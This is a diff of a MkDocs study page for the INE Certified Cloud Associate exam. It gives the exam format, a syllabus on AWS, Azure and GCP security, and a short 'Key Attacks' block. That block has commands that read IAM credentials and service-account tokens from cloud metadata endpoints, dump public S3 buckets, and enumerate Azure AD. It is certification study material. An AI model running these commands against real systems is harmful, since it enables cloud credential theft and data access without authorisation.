@@ -164,6 +164,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#icca" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -2272,6 +2277,26 @@
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
       
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ICCA
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
         
@@ -2289,6 +2314,69 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#exam-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exam Format
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#syllabus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Syllabus
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Attacks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2825,6 +2913,60 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#exam-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exam Format
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#syllabus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Syllabus
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Attacks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -2844,9 +2986,67 @@
   
 
 
-  <h1>ICCA</h1>
-
-
+<h1 id="icca">ICCA<a class="headerlink" href="#icca" title="Permanent link">&para;</a></h1>
+<p><strong>INE Certified Cloud Associate</strong> — cloud security fundamentals covering AWS, Azure, and GCP from an attacker and defender perspective.</p>
+<h2 id="exam-format">Exam Format<a class="headerlink" href="#exam-format" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>Duration:</strong> 3 hours</li>
+<li><strong>Format:</strong> Multiple choice + practical scenario questions</li>
+<li><strong>Passing Score:</strong> 70%</li>
+</ul>
+<h2 id="syllabus">Syllabus<a class="headerlink" href="#syllabus" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Domain</th>
+<th>Topics</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cloud Fundamentals</td>
+<td>IaaS/PaaS/SaaS, shared responsibility model, cloud architecture</td>
+</tr>
+<tr>
+<td>AWS Security</td>
+<td>IAM, S3 bucket misconfigs, EC2 metadata, Lambda, CloudTrail</td>
+</tr>
+<tr>
+<td>Azure Security</td>
+<td>AAD, RBAC, storage accounts, Key Vault, Azure AD enumeration</td>
+</tr>
+<tr>
+<td>GCP Security</td>
+<td>IAM, Cloud Storage, GCE metadata, service accounts</td>
+</tr>
+<tr>
+<td>Cloud Attack Techniques</td>
+<td>SSRF → metadata, misconfigured storage, privilege escalation in cloud</td>
+</tr>
+<tr>
+<td>Cloud Defense</td>
+<td>Logging, monitoring, CSPM, CIS benchmarks</td>
+</tr>
+</tbody>
+</table>
+<h2 id="key-attacks">Key Attacks<a class="headerlink" href="#key-attacks" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># AWS metadata (from SSRF or EC2 shell)</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>curl<span class="w"> </span>http://169.254.169.254/latest/meta-data/
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>curl<span class="w"> </span>http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="c1"># Enumerate S3 buckets</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>s3://bucket-name<span class="w"> </span>--no-sign-request
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>aws<span class="w"> </span>s3<span class="w"> </span>sync<span class="w"> </span>s3://bucket-name<span class="w"> </span>.<span class="w"> </span>--no-sign-request
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="c1"># Azure AD enumeration</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>Get-AzureADUser
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>Invoke-AADIntReconAsGuest
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="c1"># GCP metadata</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>curl<span class="w"> </span><span class="s2">&quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Metadata-Flavor: Google&quot;</span>
+</span></code></pre></div>
+<h2 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h2>
+<p><code>pacu</code> <code>cloudmapper</code> <code>ScoutSuite</code> <code>prowler</code> <code>aws-cli</code> <code>az-cli</code> <code>gcloud</code></p>
 
 
 
